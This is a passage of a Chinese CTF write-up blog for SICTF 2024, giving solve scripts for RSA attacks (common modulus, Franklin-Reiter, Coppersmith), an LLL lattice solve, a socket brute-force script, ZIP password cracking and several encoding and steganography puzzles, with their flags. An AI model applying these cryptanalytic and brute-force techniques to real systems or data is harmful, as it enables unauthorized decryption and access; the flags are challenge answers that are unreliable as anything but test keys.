class="number">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></span><br><span class="line"></span><br><span class="line">g,x,y=gmpy2.gcdext(e1,e2)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n)%n</span><br><span class="line">m=gmpy2.iroot(m,g)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;SICTF&#123;S0_Great_RSA_Have_Y0u_Learned?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="easyLattice-待补充">easyLattice[待补充]</h3><p>感觉在考逆元和模的基本运算？但是没做出来悲伤。</p><p>翻wp发现是考格密码，按照<a href="https://blog.csdn.net/u010883831/article/details/128262134">VSCode配置sage教程 不用notebook直接运行+代码高亮+命令行输出_sage windows-CSDN博客</a>安装好环境，（最后失败了，于是把库全放到自带的解释器里面）</p><p>没见过呀（TVT），看不懂，之后再说</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">h = <span class="number">9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443</span></span><br><span class="line">p = <span class="number">11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947</span>     </span><br><span class="line">T = <span class="number">2</span>^<span class="number">250</span></span><br><span class="line"></span><br><span class="line">L = Matrix(ZZ,[[<span class="number">1</span>,T*h],[<span class="number">0</span>,T*p]])</span><br><span class="line"></span><br><span class="line">f,g = L.LLL()[<span class="number">0</span>]</span><br><span class="line">f,g = <span class="built_in">abs</span>(f),<span class="built_in">abs</span>(g)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(f)))</span><br><span class="line"><span class="comment"># SICTF&#123;e3fea01c-18f3-4638-9544-9201393940a9&#125;</span></span><br></pre></td></tr></table></figure><p>大概是说<br>$$<br>h = (f^{-1}g) \mod p<br>$$</p><p>$$<br>g = fh+kp<br>$$</p><h1>$$<br>\begin{pmatrix}<br>f &amp; k \<br>\end{pmatrix}<br>\times<br>\begin{pmatrix}<br>1 &amp; h \<br>0 &amp; p<br>\end{pmatrix}</h1><p>\begin{pmatrix}<br>f &amp; g \<br>\end{pmatrix}<br>$$</p><h3 id="gggcd-待补充">gggcd[待补充]</h3><p>这个第一次见到诶，好怪：同e，n不同m，$m_2=f(m_1)$</p><p>m2是m1的线性变换</p><p>然后已知c1，c2，n，e</p><p>查了查，原来这个叫相关消息攻击</p><p>通过求可能的g再求其gcd（g1，g2）得到m</p><p>看大佬们的wp，exp都是用sage写的，我安装好后也不能导入python，但是直接用sage自带的好像可以，不过不能导入Crypto.Util.number，我就先解出m再longtobytes</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">....: c2 = <span class="number">205635624489021368248826364689528951802539834493392269547383991633413</span></span><br><span class="line">....: <span class="number">32272571882209784996486250189912121870946577915881638415484043534161071782</span></span><br><span class="line">....: <span class="number">38735899371291867878739806568899981073418921390469351451959495552246015176</span></span><br><span class="line">....: <span class="number">94795153230498219402854082280557713496709195875609525488767962526341049263</span></span><br><span class="line">....: <span class="number">67078177733076253</span></span><br><span class="line">....: e = <span class="number">65537</span></span><br><span class="line">....: a = <span class="number">233</span></span><br><span class="line">....: b = <span class="number">9527</span></span><br><span class="line">....:</span><br><span class="line">....: <span class="keyword">import</span> binascii</span><br><span class="line">....: <span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2</span>):</span><br><span class="line">....:     PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">....:     g1 = (x)^e - c1</span><br><span class="line">....:     g2 = (<span class="number">233</span>*x+<span class="number">9527</span>)^e - c2</span><br><span class="line">....:</span><br><span class="line">....:     <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">....:         <span class="keyword">while</span> g2:</span><br><span class="line">....:             g1, g2 = g2, g1 % g2</span><br><span class="line">....:         <span class="keyword">return</span> g1.monic()</span><br><span class="line">....:     <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">....:</span><br><span class="line">....: m=franklinReiter(n,e,c1,c2)</span><br><span class="line">....: <span class="built_in">print</span>((m))</span><br><span class="line"><span class="number">11658736990073968144116409270602503966776095409763057826884617698882016691134900406351481309826095854973</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">print</span>(long_to_bytes(<span class="number">11658736990073968144116409270602503966776095409763057826884617698882016691134900406351481309826095854973</span>))</span><br><span class="line"><span class="attribute">b</span>&#x27;SICTF&#123;<span class="number">45115</span>fb2-<span class="number">84</span>d6-<span class="number">4369</span>-<span class="number">88</span>c2-c8c3d72b4c55&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="签到，确信-待补充">签到，确信![待补充]</h3><p>我不解，但我大受震撼</p><h3 id="铜匠-待补充">铜匠[待补充]</h3><p>似乎这个是已知p的高位</p><p>但是转5进制之后似乎不能准确表示p的高位，难度是把n转5进制？</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> Crypto.Util.number import *</span><br><span class="line"><span class="attribute">import</span> gmpy2</span><br><span class="line"><span class="attribute">from</span> tqdm import *</span><br><span class="line"></span><br><span class="line"><span class="attribute">leak</span> = <span class="string">&quot;2011133132443111302000224204142244403203442000141102312242343143241244243020003333022112141220422134444214010012&quot;</span></span><br><span class="line"><span class="attribute">n</span> = <span class="number">85988668134257353631742597258304937106964673395852009846703777410474172989069717247424903079500594820235304351355706519069516847244761609583338251489134035212061654870087550317540291994559481862615812258493738064606592165529948648774081655902831715928483206013332330998262897765489820121129058926463847702821</span></span><br><span class="line"><span class="attribute">e</span> = <span class="number">65537</span></span><br><span class="line"><span class="attribute">c</span> = <span class="number">64708526479058278743788046708923650158905888858865427385501446781738669889375403360886995849554813207230509920789341593771929287415439407977283018525484281064769128358863513387658744063469874845446480637925790150835186431234289848506337341595817156444941964510251032210939739594241869190746437858135599624562</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> five_to_ten(num):</span><br><span class="line">    <span class="attribute">temp</span> = <span class="number">0</span></span><br><span class="line">    <span class="attribute">i</span> = <span class="number">109</span></span><br><span class="line">    <span class="attribute">for</span> j in reversed(num):</span><br><span class="line">        <span class="attribute">temp</span> += int(j) * <span class="number">5</span>**i</span><br><span class="line">        <span class="attribute">i</span> += <span class="number">1</span></span><br><span class="line">    <span class="attribute">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="attribute">leak</span> = five_to_ten(leak)</span><br><span class="line"><span class="attribute">gift</span> = leak &gt;&gt; <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> i in trange(<span class="number">2</span>^<span class="number">8</span>):</span><br><span class="line">    <span class="attribute">ph</span> = gift &lt;&lt; <span class="number">8</span></span><br><span class="line">    <span class="attribute">phigh</span> = ph + i</span><br><span class="line">    <span class="attribute">phigh</span> = phigh &lt;&lt; <span class="number">248</span></span><br><span class="line">    <span class="attribute">R</span>.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="attribute">f</span> = phigh + x</span><br><span class="line">    <span class="attribute">res</span> = f.small_roots(X=<span class="number">2</span>^<span class="number">248</span>, beta=<span class="number">0</span>.<span class="number">4</span>, epsilon=<span class="number">0</span>.<span class="number">01</span>)</span><br><span class="line">    <span class="attribute">if</span> res !=<span class="meta"> []:</span></span><br><span class="line"><span class="meta">        p = phigh + int(res[0])</span></span><br><span class="line"><span class="meta">        q = n // p</span></span><br><span class="line"><span class="meta">        d = gmpy2.invert(e,(p-1)*(q-1))</span></span><br><span class="line"><span class="meta">        m = pow(c,d,n)</span></span><br><span class="line"><span class="meta">        print(f&quot;i = &#123;i&#125;&quot;)</span></span><br><span class="line"><span class="meta">        print(long_to_bytes(int(m)))</span></span><br><span class="line"><span class="meta">        break</span></span><br><span class="line"><span class="meta"></span></span><br></pre></td></tr></table></figure><h3 id="babyRSA-待补充">babyRSA[待补充]</h3><h3 id="easy-or-baby-RSA-待补充">easy_or_baby_RSA[待补充]</h3><h3 id="2024-New-Setback-待补充">2024_New_Setback[待补充]</h3><hr><h2 id="MISC">MISC</h2><h3 id="签到">签到</h3><p>略</p><h3 id="geekchallenge">geekchallenge</h3><p>这个要连接一个地址，连接后是一个猜数字游戏，114位，一共5种字符，一开始尝试了很久不知道为什么错了，最后发现它延迟一次显示，上一次的结果出现在下一次在，那么解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有可见字符</span></span><br><span class="line">visible_chars = string.printable[:-<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个socket对象</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到服务器</span></span><br><span class="line">s.connect((<span class="string">&quot;yuanshen.life&quot;</span>, <span class="number">34757</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个114位的列表，初始值为None</span></span><br><span class="line">password = [<span class="literal">None</span>] * <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存上一次的字符</span></span><br><span class="line">last_char = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环遍历所有可能的字符</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> visible_chars:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(v <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">for</span> v <span class="keyword">in</span> password):</span><br><span class="line">        <span class="comment"># 将guess设为password并将空位全部改为char</span></span><br><span class="line">        guess = <span class="string">&#x27;&#x27;</span>.join([v <span class="keyword">if</span> v <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> char <span class="keyword">for</span> v <span class="keyword">in</span> password]) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 否则，guess为114个相同的字符</span></span><br><span class="line">        guess = char * <span class="number">114</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送字符串到服务器</span></span><br><span class="line">    s.send(guess.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收服务器的响应</span></span><br><span class="line">    response = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(guess)</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line">    <span class="comment"># 如果response中有&#x27;1&#x27;，就把上一次的char放入password中的每一个返回的&#x27;1&#x27;的位置</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> response <span class="keyword">and</span> last_char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> i, bit <span class="keyword">in</span> <span class="built_in">enumerate</span>(response):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(password) <span class="keyword">and</span> bit == <span class="string">&#x27;1&#x27;</span><span class="keyword">and</span> password[i] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                password[i] = last_char</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新上一次的字符</span></span><br><span class="line">    last_char = char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">filter</span>(<span class="literal">None</span>, password)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    message = <span class="built_in">input</span>(<span class="string">&quot;请输入你要发送的消息：\n&quot;</span>)</span><br><span class="line">    message += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    s.send(message.encode())</span><br><span class="line">    response = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line">s.close()</span><br><span class="line"><span class="comment">#SICTF&#123;18e62b78-c753-407c-9b0f-aa386fb4d6fd&#125;</span></span><br></pre></td></tr></table></figure><h3 id="New-year-s-regret">New_year`s regret</h3><p>给了一个压缩包，有秘密，但是说了格式：xxxxSICTF</p><p>那就掩码爆破：格式是???SICTF</p><p>出来是2024SICTF</p><p>解压压缩包得到一个task.png和output.txt，同时压缩包注释表示压缩包有额外数据，用010editor查看得：43637d135333</p><p>task.png是400x400的类似二维码的黑白图像，一行25个格</p><p>output.txt是一堆0101二进制串，22464个字符加一个换行符</p><p>那么很有可能要把output转为图片，但是并不知道要怎么转换。</p><p>然后这里的额外数据43637d135333实在想不出来是什么意思，看wp后才知道要反转之后from hex：351×64刚好22464</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image_from_file</span>(<span class="params">filename, width, height</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    pixels = img.load()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">        row = i // width</span><br><span class="line">        col = i % width</span><br><span class="line">        <span class="keyword">if</span> data[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            pixels[col, row] = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)  </span><br><span class="line">        <span class="keyword">elif</span> data[i] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            pixels[col, row] = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)  </span><br><span class="line"></span><br><span class="line">    img.save(<span class="string">&#x27;output.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create_image_from_file(<span class="string">&#x27;output.txt&#x27;</span>,<span class="number">351</span>,<span class="number">64</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/21/GcEh8Qu1xPMSW3o.png" alt="output"></p><p>得到一张五线谱，这个叫Music Sheet Cipher</p><p>通过网站：<a href="https://www.dcode.fr/music-sheet-cipher">Music Sheet Cipher - Online Notes Decoder, Encoder, Translator (dcode.fr)</a></p><p>来解码</p><p>得到：PUTITALLTOGETHER/put_it_all_together</p><p>以zip形式打开task.png</p><p>发现有base64编码的字符,解码后好像还是base64，多试几次，最后发现35次的时候有PNG的标志，37次就不能继续了，把它输出成png，是一个二维码，扫码然后获得部分flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">    data = base64.b64decode(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;something.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(data)</span><br></pre></td></tr></table></figure><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;Congratuation_to_you!</span><br></pre></td></tr></table></figure><p>再查看task.png,二进制打开看有没有什么标志，除了50 4B 03 04还有一个PNG，复制PNG保存打开是一张武器表，根据提示：你知道这是几星吗想到要找武器星级</p><p><img src="https://s2.loli.net/2024/02/21/EATqRXUfzZDg5F4.png" alt="k"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">44664654464566654465645644544664654654644546445446646565444454544664654664544545646454544454466465465645644</span><br></pre></td></tr></table></figure><p>结果是如上。四五六有三种变化，猜莫斯密码</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">..--.-</span> <span class="string">..-.</span> <span class="params">---</span> <span class="string">..-</span> -. -<span class="string">..</span> <span class="string">..--.-</span> <span class="string">.-</span> <span class="string">.-..</span> <span class="string">.-..</span> <span class="string">..--.-</span> - <span class="string">....</span> . <span class="string">..--.-</span> <span class="string">.--.</span> <span class="string">..</span> . -<span class="string">.-.</span> . <span class="string">...</span> <span class="string">..--.-</span> <span class="string">.-</span> -. -<span class="string">..</span></span><br></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">_FOUND_ALL_THE_PIECES_AND</span></span><br></pre></td></tr></table></figure><p>拼接flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">SICTF</span><span class="template-variable">&#123;Congratulation_to_you!_found_all_the_pieces_and_put_it_all_together&#125;</span></span><br></pre></td></tr></table></figure><h3 id="WHOWHOWHO">WHOWHOWHO</h3><p>又是有密码的压缩包,但是有提示：6位数小写密码，爆破：qweqwe</p><p>二号位置有空白字符，很明显是0宽隐写,网上找工具解密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">U2FsdGVkX19uvldJ6CGUNff3B28QEdIjZqgUh98K</span>+/<span class="number">0</span>J16ELU8WVQydohw4P5+<span class="number">2</span>M</span><br><span class="line"><span class="attribute">jbhTLQHNOpcoOd7kSRgy8pwpovCmimdD8M0IbYUeXjNKYePL</span>/WP4PCMaOJHAW3HR</span><br><span class="line"><span class="attribute">b7IEoDDH1NYh3o5NwMmcFEqy1ujf72VgQIQkaeYFFFE</span>=</span><br></pre></td></tr></table></figure><p>base64，有三行，直接解密，解完发现是乱码，但是一开头说salted，加盐了</p><p>上网查时发现rabbit加密开头一定是U2FsdGVkX1，base64之后就是salted_所以尝试用这个解密，需要key才可以，根据txt文件中的谁是渣男，尝试：shumu</p><p>成功</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GTAGAGCTAGTCCTT&#123;GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTC<span class="built_in">A_GTAGACGTGGCGGTG</span>_GTAGACTC<span class="built_in">A_TATGACCGG</span>_GCTCGGGCT&#125;</span><br></pre></td></tr></table></figure><p>这个是dna加密，好像没有直接解密的，但是有脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">        <span class="string">&#x27;AAA&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;AAC&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;AAG&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;AAT&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;ACA&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;ACC&#x27;</span>:<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;ACG&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;ACT&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;AGA&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;AGC&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;AGG&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;AGT&#x27;</span>:<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;ATA&#x27;</span>:<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;ATC&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;ATG&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;ATT&#x27;</span>:<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;CAA&#x27;</span>:<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;CAC&#x27;</span>:<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;CAG&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;CAT&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;CCA&#x27;</span>:<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;CCC&#x27;</span>:<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;CCG&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;CCT&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;CGA&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;CGC&#x27;</span>:<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;CGG&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;CGT&#x27;</span>:<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;CTA&#x27;</span>:<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;CTC&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;CTG&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;CTT&#x27;</span>:<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;GAA&#x27;</span>:<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;GAC&#x27;</span>:<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;GAG&#x27;</span>:<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;GAT&#x27;</span>:<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;GCA&#x27;</span>:<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;GCC&#x27;</span>:<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;GCG&#x27;</span>:<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;GCT&#x27;</span>:<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;GGA&#x27;</span>:<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;GGC&#x27;</span>:<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;GGG&#x27;</span>:<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;GGT&#x27;</span>:<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;GTA&#x27;</span>:<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;GTC&#x27;</span>:<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;GTG&#x27;</span>:<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;GTT&#x27;</span>:<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;TAA&#x27;</span>:<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;TAC&#x27;</span>:<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;TAG&#x27;</span>:<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;TAT&#x27;</span>:<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;TCA&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;TCC&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;TCG&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;TCT&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;TGA&#x27;</span>:<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;TGC&#x27;</span>:<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;TGG&#x27;</span>:<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;TGT&#x27;</span>:<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;TTA&#x27;</span>:<span 